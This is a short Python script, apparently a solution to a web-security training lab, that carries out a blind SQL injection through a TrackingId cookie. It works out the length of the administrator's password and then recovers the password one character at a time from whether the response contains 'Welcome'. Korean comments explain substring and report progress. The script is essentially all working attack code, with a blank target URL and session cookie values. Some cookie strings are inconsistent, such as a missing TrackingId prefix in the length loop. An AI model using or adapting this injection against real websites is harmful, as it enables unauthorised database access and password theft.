import sys
import requests

def blind_sql_injection():
  ret = ''
  i = 1
  base_cookie = f"TrackingId=abc' and (select 'a' from users limit {i})='a; session=0CAdBr3vU2Gzsvyy6nlB3AoigXu8eIlr"
  url = ''
  headers = {}
  headers['cookie'] = base_cookie
  res = requests.get(url,headers=headers)
  tmp = res.text
  
  while "Welcome" in tmp:
    i +=1 
    headers['cookie'] = f"abc' and (select 'a' from users WHERE username='administrator' and length(password)>{i})='a;session="
    res = requests.get(url,headers=headers)
    tmp = res.text
  a = i
  
  #substirng(열 이름,시작위치,읽을 길이)
  #ex substring('users',1,1) = > users 열의 첫번째 글자부터 한글자만 가져온다.  
  for x in range(1,a+1):
    print(f"{int((x/a)*100)}%..진행 중")
    for y in range(48,122):
      headers['cookie'] = f"TrackingId=vrRrXGZSL5kUzpub' and (select substring(password,{x},1) from users WHERE username='administrator')='{chr(y)};session=0CAdBr3vU2Gzsvyy6nlB3AoigXu8eIlr"
      res = requests.get(url,headers=headers)
      tmp = res.text
      if "Welcome" in tmp:
        ret +=chr(y)
        break
      
  return ret 
    
answer = blind_sql_injection()
print(answer)
  
